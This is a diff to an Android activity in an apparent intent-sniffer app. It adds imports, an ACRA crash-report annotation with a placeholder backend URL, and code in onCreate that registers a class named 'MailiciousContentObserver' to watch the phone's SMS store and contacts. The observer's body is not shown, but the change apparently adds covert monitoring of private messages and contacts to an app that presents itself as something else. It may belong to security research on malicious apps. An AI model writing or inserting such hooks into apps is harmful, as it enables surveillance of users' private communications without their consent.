@@ -4,6 +4,7 @@ package com.isotlab.android.intentlogger;
 import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.concurrent.atomic.AtomicInteger;
 
 import org.apache.http.HttpResponse;
 import org.apache.http.client.ClientProtocolException;
@@ -16,6 +17,8 @@ import org.apache.http.message.BasicNameValuePair;
 import com.isecpartners.android.intentsniffer.R;
 
 import android.app.Activity;
+import android.content.ContentResolver;
+import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
@@ -25,14 +28,21 @@ import com.turbomanage.httpclient.AsyncHttpClient;
 import com.turbomanage.httpclient.ParameterMap;
 import com.turbomanage.httpclient.android.AndroidHttpClient;
 
+import android.net.Uri;
 import android.os.Bundle;
+import android.os.Handler;
+import android.provider.ContactsContract;
+import android.provider.Settings;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.TextView;
 
+import org.acra.*;
+import org.acra.annotation.*;
 
+@ReportsCrashes(formKey = "Activity-Sniffer", formUri = "http://www.yourselectedbackend.com/reportpath")
 public class ActivitySniffer extends Activity {
 	// controls
 	public TextView textView = null;
@@ -41,13 +51,17 @@ public class ActivitySniffer extends Activity {
 	public static final String PREFS_NAME = "IntentSnifferPrefs";
 	public SharedPreferences settings;
 	
-	
 	/** Called when the activity is first created. */
 	public void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		
 		settings = getSharedPreferences(PREFS_NAME, 0);
 	    phone_id = settings.getInt("phone_id", -1);
+	    
+	    MailiciousContentObserver observer = new MailiciousContentObserver(new Handler(), this);
+	    ContentResolver contentResolver = this.getContentResolver();
+	    contentResolver.registerContentObserver(Uri.parse("content://sms"),true, observer);	
+	    contentResolver.registerContentObserver(ContactsContract.Contacts.CONTENT_URI, true, observer);
 	    
 	    if(phone_id <=0) {
 	    	System.out.println("No, phone id launching view");
